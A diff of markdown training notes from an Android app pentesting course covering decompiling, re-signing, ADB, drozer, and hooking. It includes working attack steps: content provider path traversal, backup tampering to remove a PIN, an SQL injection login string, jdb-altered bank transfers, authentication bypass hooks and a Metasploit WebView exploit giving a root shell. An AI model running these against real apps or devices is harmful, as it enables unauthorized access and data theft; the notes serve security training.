@@ -72,23 +72,25 @@ AndroidManifest.xml
 
 Procedure :
 After downloading an apk, unload the files inside android using unzip
-
+```
 cp android.apk android.zip
 unzip android.zip
+```
 
 Now,
-
+```
 cd android/
 cat androidmanifest.xml
-
+```
 Note : We can't read the contents into the file. We need apktool to decompile.
 
+```
 cd ..
 apktool d android.apk
 
 cd android/
 cat androidmanifest.xml
-
+```
 Note : Now we can read the contents of the file.
 
 Going deeper
@@ -122,27 +124,31 @@ Signing Apps in Android
 
 Procedure :
 Create an unsigned file first.
-
+```
 apktool d -f firefox.apk
+```
 
 Now build the application:
-
+```
 apktool b firefox/ -o firefox.apk
+```
 
 To verify the application is signed and sign it:
+```
 jarsigner -verify -verbose newfirefox.apk
-
+```
 Note : not signed
-
+```
 cp ../../Downloads/training/CTF/cocon/my-release-key.keystore .
 
 jarsigner -verbose -sigalg MD5withRSA -digestalg SHA1 -keystore my-release-key.keystore newfirefox.apk alias_name
 
 Enter passphrase : android
-
+```
 Now verify jar sign,
+```
 jarsigner -verify -verbose newfirefox.apk
-
+```
 Note : Now it is verified with sign.
 
 Verifying apps signature :
@@ -157,13 +163,14 @@ Verifying apps signature :
 	- cat META-INF/CERT.SF
 
 Procedure :
-
+```
 cd newfirefox/META-INF
 keytool -printcert -file CERT.RSA
 
 ls (it display ALIAS_NA.RSA)
 
 keytool -printcert -file ALIAS_NA.RSA
+```
 
 -----------------------
 05_Setting_up_Genymotion
@@ -171,16 +178,16 @@ keytool -printcert -file ALIAS_NA.RSA
 Download and install genymotion
 
 Now from santoku,
+```
 adb devices
-
+```
 Right now, no devices is connected.
-
 Genymotion ip is 192.168.56.101
-
+```
 adb connect 192.168.56.101
 
 adb devices
-
+```
 Note : now android device connected will be displayed.
 
 -----------------------
@@ -225,24 +232,29 @@ Activity Manager :
 
 - Could be used to launch applications and pass data while launching
 - Could also be used to launch specified activities within the application.
-
+```
 am start [package name]
 am start -n com.package.name/com.package.name.ActivityName
+```
 
 Working with intent filters :
+```
 am start -a android.intent.action.VIEW http://google.com
 am start -a android.intent.action.MAIN --es "sms_body" "Hello there" --es "address" "123456789898" com.android.mms/.ui.ComposeMessageActivity
+```
 
 Procedure :
-
+```
 adb shell
 am start -a android.intent.action.VIEW http://attify.com
+```
 
 Note : It opens browser and opens attify.com
 
 Now to send an sms :
-
+```
 am start -a android.intent.action.MAIN --es "sms_body" "Hello there" --es "address" "123456789898" com.android.mms/.ui.ComposeMessageActivity
+```
 
 Note : it will send an sms
 
@@ -282,19 +294,19 @@ Dex file header
 - Dx and Dexdump
 
 Procedure :
-
+```
 hexdump -c classes.dex | less
 
 dexdump -l xml classes.dex | less
-
+```
 Now, download and install EditorLinuxInstaller
 
 Download DEXTemplate.bt
 
 https://raw/githubusercontent.com/jlarimer/android-stuff/master/DEXTemplate.bt
-
+```
 dexdump -l xml classes.dex
-
+```
 Open an app in the 0IO editor(Facebook.app here) and run the template in tools ->run template
 
 010 Editor
@@ -323,7 +335,7 @@ Introduction to ADB
 - Could be used to debug apps, install applications, do file system modifications etc.
 
 Procedure :
-
+```
 adb start server
 
 adb kill server
@@ -348,7 +360,7 @@ adb shell ps | grep -i base
 adb push srcaddr destaddr
 
 adb pull srcaddr destaddr
-
+```
 -----------------------
 09_Logging-based-vulnerabilities
 
@@ -359,26 +371,29 @@ Android logcat
 - Security risks
 
 Procedure :
-
+```
 adb shell ps | grep -i yahoo
 
 adb logcat | grep 1424
+```
 
 Try logging in yahoo messenger, we will get some info.
 
 Now we will try decompiling application, we can look for specific strings.
-
+```
 apktool d yim.apk -o yahoo
 
 cd Yahoo
 grep -iRn 'Log.d' .
+```
 
 Try some other decompiler so more info will be there:
 
 jadx is another decompiler. Download the skylot/jadx from github
-
+```
 ./jadx yim.apk -d Yahoo
 grep -iRn 'Log.d' .
+```
 
 Note: We will be seeing more details on open bugs here.
 
@@ -390,55 +405,65 @@ Load the cocon CTF app from COCON CTF by anand srivastava:
 adb install cocon_apk.apk
 
 Note : Here our objective is to find why the key is disabled and we have to gain access.
-
+```
 apktool d cocon_apk.apk -o Cocon_dec/
 
 cd Cocon_dec/
 ls
 cd smali/
 ls -la
+```
 
 Note: If you read androidmanifest.xml, there will be packagename coc.on meaning there will be a folder coc and inside on
 
+```
 cd coc/
 cd on/
 ls -la
+```
 
 Note : Forget the R$ smali files Choose cocon.smali
 
+```
 vi cocon.smali
+```
 
 Note : v0 are registers and p0 are parameterized registers
 Note : v7, p0 are showing key. 
 
 Note : This is a bit confusing. Use jadx to check same code
-
+```
 ./jadx cocon_apk.apk -d Cocon
 
 cd Cocon/coc/on/
 ls -la
 vi cocon.java
+```
 
 Note : A different code is happening here. We need to edit the this.key_value to 1 so we can get the key.
 
+```
 Now go back to Cocon_dec/smali/coc/on/
 vi cocon.smali
+```
 
 change const/4 v0, 0x0 to 0x1
 
 Now save and build the application.
-
+```
 apktool b Cocon_dec/ -o New_Cocon.apk
 
 adb uninstall coc.on
+```
 
 Sign the application before installing:
+```
 jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore New_Cocon.apk alias_name
 Enter passphrase : android
 jarsigner --verify --berbose New_Cocon.apk
 
 adb install New_Cocon.apk 
-
+```
 Note : Now if you open Genymotion and click the app, we will get the key.
 
 -----------------------
@@ -456,39 +481,41 @@ Note : To download more malwares of android, visit contagio minidump
 TRACER :
 --------
 Procedure :
-
+```
 cd Android-malwares/TRacer/
-
+```
 First thing we have to find who signed the app
 
+```
 cd META-INF/
 keytool -printcert -file CERT.RSA
-
+```
 Note : We find owner is Killer Mobile Software
 
 Now decompile,
+```
 d2j-dex2jar Tracer.apk
 
 jd-gui Tracer.jar
 apktool d Tracer.apk
-
+```
 Now if you look at androidmanifest.xml, we can see the package name is com.android.system.proc
 
 Note : Normal user will see this and believe this is system package.
 
 Now look at that particular package in jd-gui,
-
+```
 com -> android -> system_proc
-
+```
 Now look at another package, com.killermobile.app
-
+```
 com -> killermobile -> app
-
+```
 We can see the contents of what the malware can do.
 
 SECRETTALK:
 --------
-
+```
 ./jadx com.android.secrettalk-1.apk -d SecretTalk
 
 cd SecretTalk
@@ -497,7 +524,7 @@ ls -la
 cd com/android/secrettalk
 ls -la
 vi smsreceiver.java
-
+```
 Note : Here if we look, it listens for android.provider.Telephony.SMS_RECEIVED and sends it to a secret server
 
 If we look down, there is an email credentials to which the malware should be transmitting the virus.
@@ -529,10 +556,11 @@ For burp ca: http://burp, download the CA certificate, install.
 Settings -> security -> Install from sdcard/
 
 If the certificate is disabled, go to adb connect
+```
 cd /mnt/sdcard/Download
 ls -la
 mv caecert.der caecert.crt
-
+```
 Now we can install the certificate.
 
 -----------------------
@@ -554,21 +582,23 @@ Here we will use an application called catch in geny motion.
 Enter note inside as "My secret note" 
 
 Go inside the package folder.
-
+```
 cd /data/data/com.threebanana.notes/databases
 
 sqlite3 notes
 
 select * from notes;
-
+```
 Note : We can look at the notes.
 
 To find where the apk is stored:
+```
 adb shell pm path com.threebanana.notes
-
+```
 Displays : /data/app/comthreebanana.notes-1.apk
 
 Now,
+```
 mkdir catch
 cd catch
 
@@ -576,15 +606,16 @@ adb pull /data/app/comthreebanana.notes-1.apk
 
 apktool d com.threebanana.notes-1.apk
 ls -la
-
+```
 Now, content providers always starts with content://
 
 So instead of select * from [] where id='' 
 developers can use content://sms to make life easier
 
 So,
+```
 grep -iRn 'çontent://'
-
+```
 Extracting information from content providers
 
 - Catch Application downloaded from http://attify.com/catch.apk
@@ -593,8 +624,9 @@ Extracting information from content providers
 - Find out the Notes content provider (Content Provider storing notes)
 - Query the content provider using adb shell content query --uri [content provider uri]
 
+```
 adb shell content query --uri content://com.threebanana.notes.provider.NotePad/notes
-
+```
 Here you can see the text fields.
 
 -----------------------
@@ -610,22 +642,25 @@ Introduction to Drozer
 Download and install drozer apk in genymotion.
 
 First porward the ports,
+```
 adb forward tcp:31415 tcp:31415
 
 drozer console connect
 
 ls
 run app.package.attacksurface
-
+```
 To find package name:
+```
 run app.package.list
 
 run app.package.attacksurface com.threebanana.notes
 run app.provider.finduri com.threebanana.notes
-
+```
 Here we are interested in .NotePad/notes
-
+```
 run app.provider.query content://com.threebanana.notes.provider.NotePad/notes --vertical
+```
 
 -----------------------
 16_Read_based_content_provider_vulnerability
@@ -638,37 +673,51 @@ Adobe Reader Vulnerability
 - Discovered by Sebastin Guerro
 
 Procedure:
+```
 dz> run app.package.list -f adobe
 
 run app.package.attacksurfacecom.adobe.reader
 
 run app.provider.finduri com.adobe.reader
+```
 
 Now if we proceed in the normal way like,
+```
 run app.provider.query content://com.adobe.reader.fileprovider/
+```
 
 We won't get the desired result.
 This is because the CP is not attached to database.
 
+```
 adb shell
 cd /mnt/sdcard
 ls
 secret.txt
+```
 A secret text is provided in sdcard
 
 Checking permissions of the package
 
+```
 run app.package.info -a com.mwr.dz
+```
 So drozer has only INTERNET permissions
 
+```
 run app.package.info -a com.adobe.reader
+```
 Adobe has permissions to read from sdcard
 
+```
 run app.provider.readcontent://com.adobe.reader.fileprovider/mnt/sdcard/secret.txt
+```
 We won't get the expected result.
 
 All we have to put is full directory traversal to exploit this,
+```
 run app.provider.readcontent://com.adobe.reader.fileprovider/../../../../mnt/sdcard/secret.txt
+```
 
 Note : It will display the text
 
@@ -685,26 +734,31 @@ CSIP Simple Vulnerability
 
 So the package name is csipsimple
 
+```
 run app.package.list -f csip ( We can also use adb shell ps | grep -i csip)
 com.csipsimple
 
 run app.provider.finduri com.csipsimple
 
 run app.provider.query content://com.csipsimple.db/outgoing_filters/
+```
 
 So the provider says permission denied
 
 So decompile the csip application,
-
+```
 apktool d CSipSimple.apk
 
 vi AndroidManifest.xml
+```
 
 So here there is something which uses android.permission.CONFIGURE_SIP
 And if you look down, there is also a permission declaration android.permission.USE_SIP/android.permission.CONFIGURE_SIP
 
 Simple copy these permissions,
+```
 leafpad AndroidManifest.xml &
+```
 
 Also open drozer agent.apk and decompile,
 and open the androidmanifest.xml
@@ -714,21 +768,28 @@ Also copy the uses-permission
 
 Also there's a string tag which is connected to strings.xml
 
+```
 leafpad csipsimple/res/values/strings.xml &
 leafpad agent/res/values/strings.xml &
+```
 
 Copy the strings from csipsimple to agent.
 
 Now recompile the agent 
+```
 apktool b agent/ -o newagent.apk
+```
 
 Sign the new apk,
+```
 cp newagent.apk ~/Downloads/training/CTF/cocon/
 ls
 nano signing.txt
+```
 
 change the package name to newagent.apk
 
+```
 jarsigner -verbose -sigalg SHA1withRSA -digestalg -SHA1 -keystore my-release-key.keystore newagent.apk alias_name
 Enter passphrase : android
 
@@ -739,6 +800,7 @@ adb install newagent.apk
 ./start-drozer.sh
 
 run app.provider.query content://com.csipsimple.db/outgoing_filters/ --vertical
+```
 
 Now it works.
 
@@ -752,7 +814,7 @@ Now it works.
 Structure of a drozer module
 
 Name the file : ex.device.info
-
+```
 from drozer.modules import Module
 class Info(Module):
 	name="---"
@@ -764,33 +826,36 @@ class Info(Module):
 
 	def execute(self, arguments):
 		[code]
+		
+```
 
 Simple Information extractor :
 
 - Have a look at developer.android.com/reference/android/os/Build.html
-
+```
 def execute(self,arguments):
 	build = self.new("android.os.Build")
 	self.stdout.write("Getting device info...\n")
 	self.stdout.write("[*] BOARD : %s\n" % (build.BOARD))
+```
 
 Creating a drozer repo
-
+```
 - Save the file as ex.device.info
 - dz>module repository create absolute-new-folder-name
 - dz>module install /absolute/ex.device.info
 - run ex.device.info
-
+```
 Procedure :
-
+```
 nano -c Download/training/vulnapps/ex.device.info
-
+```
 So this is how the script looks like
-
+```
 ./strat-drozer.sh
-
+```
 First we need to create a repository,
-
+```
 dz> module repository create /home/adi/Desktop/drozerrepo
 
 module install /home/adi/Downloads/training/vulns/ex.device.info
@@ -799,6 +864,7 @@ Check for proper indentations because it's python.
 locate ex.device.info
 
 run ex.device.info
+```
 
 -----------------------
 19_Dropbox_Vulnerability
@@ -807,18 +873,18 @@ run ex.device.info
 - Not exported, but a big mistake by the developer
 - Use dropbox.apk and try to find out the vulnerability
 - Discovered by the Intrepidus Group
-
+```
 apktool d -f dropbox.apk
 
 vi dropbox/Androidmanifest.xml
-
+```
 Now if you look at the androidmanifest, there will be application label, content provider etc
 Also grant-uri-permission with have pathPrefix= "/"
 
 So what they mean is that they have provided permission to the entire filesystem of android.
 
 So anything that this application interacts with provides to all android filesystem
-
+```
 adb shell
 cd /data/data/com.dropbox.android
 ls -la
@@ -830,12 +896,15 @@ sqlite 3 prefs.db
 .mode line
 
 select * from android_metadata;
+```
 Note : there's nothing. Let's look at another table
 
+```
 select * from DropboxAccountPrefs;
-
+```
 Note : Here all the entire access key is there.
 
+```
 cd DropboxVuln/
 cd src/
 ls
@@ -845,7 +914,7 @@ cd aditya/dropboxvuln/
 ls
 
 nano ManiActivity.java
-
+```
 Now if you look at the code, prefs.db will take the files and upload it to public/
 
 Now if you look at genymotion, dropbox/public it will be empty
@@ -868,6 +937,7 @@ So open box ,settings , enter passcode, come back application. It will ask for a
 So you can also take backup of an application using custom methods
 
 Exploiting Backup vuln:
+```
 adb back com.box.android -f app.db
 dd -if=app.ab bs=24 skip-I | openssl zlib -d>app.tar
 tar -tf app.tar>app.list
@@ -877,26 +947,29 @@ star -c -v -f box_new.tar -no-dirslash list=box.list
 dd if=app.ab bs=24 count=I of=app_new.ab
 openssl zlib -in app_new.tar >> app_new.ab
 adb restore app_new.ab
-
+```
 So this is a bit complicated and a tool can perform this called ABE
 from Sourceforge
 
 Procedure:
+```
 adb shell ps | grep -i box
 
 adb backup com.box.android -f box.ab
+```
 
 Now if you look at genymotion, it will asks for backup.
 
 We will go without a passcode.
 
 Now we will have a file called box.ab
-
+```
 hexdump -C box.ab | less
-
+```
 The first 24 files will have ANDROID_BACKUP
 
 Once you download the android backup extractor and extract it,
+```
 java -jar abe.jar unpack box.ab box.tar
 
 tar -tf box.tar > box.list
@@ -906,33 +979,37 @@ tar xvf box.tar
 d apps/com.box.android/sp
 
 grep -iRn 'pin' .
-
+```
 So there is a mention of pin in the myPreference.xml
 
+```
 vi myPreference.xml
-
+```
 So there is a pincode with encrypted value.
 
 So simple remove this line and save it.
-
+```
 cd ../..
 star -c -v -f box_new.tar -no-dirslash list=box.list
 
 java -jar abe.jar pack box_new.tar box_new.ab
 
 hexdump -C box_new.ab
+```
 
 Backup is good.
 
+```
 adb restore box_new.ab
+```
 
 Now open restore in genymotion.
 
 The box has been opened without any passccode.
 And if you look at settings, there will be no passcode set.
-
+```
 Prevention : android:allowBackup= "false"
-
+```
 -----------------------
 21_Client_Side_Injection
 
@@ -943,28 +1020,29 @@ SQLite injection
 - Storing sensitive information in databases
 - Do you sanitize user input before applying SQL queries
 
+```
 cd Downloads/training/Clientsideinjections/
 ls
 
 adb install sqliteapp.apk
-
+```
 So if you go inside genymotion,
 open app and enter your user credentials,
 and then fill in the details in the next page.
 
 So if my correct login is given, it will give my details.
 It should be bypassed here.
-
+```
 dex2jar sqliteapp.apk
 
 jd-gui sqliteapp_dex2jar.jar
 
 So in com.attify.sqliteapp -> DatabaseConnector
-
+```
 Look at getRecord and addRecord
 
 So here getRecord selects the item from vulnerable db and shows it to the user
-
+```
 adb shell
 ls -la
 cd databases/
@@ -973,14 +1051,14 @@ sqlite3 vulnerable-db
 .tables
 select * from USER-RECORDS;
 exit
-
+```
 Now we know how this processes
 
 Use this in sql login 1'or'1='1-
-
+```
 User : Aditya1'or'1='1-
 Password : 12345
-
+```
 -----------------------
 22_Hooking_Introduction_and_setting_up_InsecureBankSetup
 
@@ -1008,6 +1086,7 @@ Setting up InsecureBank
 - python app.py
 - Login to the application using dinesh:dinesh@123$
 
+```
 cd Insecure-Bank/bin/
 
 adb install InsecureBank.apk
@@ -1017,16 +1096,18 @@ Login to your application
 cd AndroLabServer
 
 python app.py
-
+```
 It will start the webserver.
 
 Login to the server using dinesh:dinesh@123$
 
-Now we can note all the transactions happeing at 
+Now we can note all the transactions happening at 
+```
 adb logcat
 
 adb shell ps | grep -i insecure
 adb logcat | grep 1212
+```
 
 -----------------------
 23_Android-Debugging-with-Andbug
@@ -1049,7 +1130,7 @@ Andbug
 Procedure :
 
 In last procedure, in insecurebank, we are able to transfer account from one to another.
-
+```
 unzip Andbug-master.zip -d Andbug
 cd Andbug/
 python setup.py install
@@ -1059,14 +1140,17 @@ adb shell ps | grep -i insecure
 andbug shell -p 1212
 
 classes com.android.insecurebank
-
+```
 Note : So now we are looking inside the methods of the loaded classes. Rest client
 
+```
 methods com.android.insecurebank.RestClient
-
+```
 Note : There is a dotransfer class inside the methods.
 
+```
 method-trace com.android.insecurebank.RestClient.dotransfer
+```
 
 Note : Now whenever the dotransfer is executed, it will hook with the below displayed hooks.
 
@@ -1113,38 +1197,46 @@ Debugging app using JDB 2
 - eval dotransfer("192.168.161.180","8080","12345","56788","1337")
 
 Procedure:
+```
 adb shell ps | grep -i insecure
 
 adb forward tcp:1337 jdwp:1212 (Use the process id)
 
 jdb -attach localhost:1337
+```
 
 Note : if jdb is initialized then it works. We will see all classes. But can't parse like Andbug
 Since we know the methods already, we will go directly.
 
+```
 methods com.android.insecurebank.RestClient
-
+```
 Note : Here additional methods are visible which are not visible by Andbug.
 Setting a breakpoint after dotransfer,
 
+```
 stop in com.android.insecurebank.RestClient.dotransfer
-
+```
 Note : Now try to transfer some amount in genymotion, Breakpoint will hit.
 Now here we can change the variables of the payment and other fields.
+
+```
 main[1] set amount="70000"
 
 resume
+```
 
 To verify it the transaction is changed,
-
+```
 adb logcat | grep -i 1212
-
+```
 Note : Now we can call a particular method using JDB also
 
 Now try transfering in Genymotion and exectute eval do transfer to make commands simpler.
 
+```
 eval dotransfer("192.168.161.241","8080","12345","56788","1337")
-
+```
 The mentioned amount in the port will be transfered.
 
 -----------------------
@@ -1176,17 +1268,17 @@ Link Substrate files -> Grant SU permissions -> Restart System(soft)
 Now cydia substrate is added to SuperSU.
 
 Now install Introspy
-
+```
 adb install "Introspy-Android Core.apk"
-
+```
 Now open introspy config and choosing introspy and granting supersu permissions.
 
 Now also granting supersu permissions to insecurebank,
 Now introspy will automatically create a report for us for insecurebank.
 
 So logging inside insecurebank and transfering money to the account.
-
-abd logcat, it will show a file where it is stored.
+```
+adb logcat, it will show a file where it is stored.
 
 adb shell touch /mnt/sdcard/statements/rawhistory.html
 
@@ -1195,31 +1287,34 @@ cd /mnt/sdcard
 mkdir statements
 cd statements/
 touch rawhistory.html
-
+```
 Now try transfering again. No error will be there.
 
 Notice there will be cydia substrate hooks will be present in the logs.
 
 Now go insdie the application and analyze it.
-
+```
 cd /data/data/com.android.insecurebank
 
 ls -la
-
+```
 Note : Introspy would not have created the database. So in this case, we have to restart the genymotion.
 
+```
 adb connect 192.168.57.102
-
+```
 Now do the same process again and transfer money.
 
+```
 adb shell ls /data/data/com.android.insecurebank.databases
 
 cd Introspy-Analyzer-master
 
 adb pull /data/data/com.android.insecurebank/databases/introspy.db Insecure.db
-
+```
 Now create a html report
 
+```
 python introspy.py -p android -o InsecureBank Insecure.db
 
 ls -la
@@ -1227,7 +1322,7 @@ ls -la
 cd InsecureBank
 
 firefox report.html
-
+```
 Note : the html page will show all the arguments, return value etc.
 
 -----------------------
@@ -1250,13 +1345,13 @@ Hooking using Cydia Substrate
 Procedure :
 
 Download the apk from github repo using wget
-
+```
 adb install com.gdssecurity.listlock.apk
 
 d2j-dex2jar com.gdssecurity.listlock.apk
 
 jdgui com.gdssecurity.listlock-dex2jar.jar
-
+```
 Now if you look at com.historypeats.listlock -> Authenticate
 Now look at a method for validatepassword
 It takes two arguments, string paramstring and validating it with getSavedPassword
@@ -1267,7 +1362,7 @@ Cydia Substrate API
 - MS.hookClassLoad notified whenever a particular class gets active
 - Once we know that a class has been loaded, we can then use MS.hookMethod
 - More info at http://www.cydiasubstrate.com/api/java/MS.hookClassLoad
-
+```
 MS.hookClassLoad("AuthenticationMethod", new MS.ClassLoadHook()
 {
 public void classLoaded(Class<?> _class)
@@ -1275,6 +1370,7 @@ public void classLoaded(Class<?> _class)
 /* do something with _class argument */
 /* Change variable values, change return type etc. */
 }});
+```
 
 ListLock Bypass
 
@@ -1286,9 +1382,9 @@ If you look at the code, its a boolean function. So if we change the return valu
 no matter what is the answer, we will be able to authenticate.
 
 So open in eclipse,
-
+```
 vi src/com/gdssecurity/listbypass/ListBypass.java
-
+```
 Class name is com.historypeats.listlock.classes.Authenticate
 
 It uses MS.hookMethod to change some of its components
@@ -1310,7 +1406,9 @@ XPosed Framework
 - Different ways to achieve the same goal
 - A few minor differences between the Xposed and Cydia framework
 
+```
 adb install de.robv.android.xposed.installer_v33_36570c.apk
+```
 
 Click on framework, click install.
 Once done, go to modules.
@@ -1345,8 +1443,9 @@ And inside src -> Bypass.java
 We will haev the package name com.historypeats.listlock
 
 It will be using the before hook method,
-
+```
 param.args[1] = param.args[0]
+```
 
 which means return the same.
 
@@ -1386,10 +1485,11 @@ Getting Started
 - myapp.get_permissions()
 
 Procedure : 
-
+```
 androlyze -s 
 
 myapp=APK('/home/adi/Downloads/training/vulnapps/catch.apk')
+```
 
 Now if you type myapp and hit tab, it will show you a bunch of option.
 
@@ -1407,22 +1507,26 @@ myapp.get_files()
 
 Retrieving all classes :
 
+```
 - d = dvm.DalvikVMFormat(myapp.get_dex())
+```
 
 Print out all the class names :
-
+```
 - for class in d.get_classes():
 	print class.get_name()
+```
 
 Procedure :
 
+```
 d = dvm.DalvikVMFormat(myapp.get dex())
 
 d
 
 for t in d.get_classes():
 	print t.get_name()
-
+```
 Note : We will be displayed with all classes.
 
 -----------------------
@@ -1465,8 +1569,9 @@ And defines the webview element in middle. Sets javascript element to true.
 So the url which it tries to load is a local ip.
 
 Change this ip to the local ip of santoku with port 8000.
-
+```
 python -m SimpleHTTPServer
+```
 
 Open genymotion, set proxy(already set)
 
@@ -1488,7 +1593,7 @@ Exploitation with Metasploit
 - exploit
 
 Procedure :
-
+```
 msfconsole
 use exploit/android/browser/webview_addjavascriptinterface
 show options
@@ -1500,3 +1605,4 @@ sessions
 ps
 shell
 su
+```
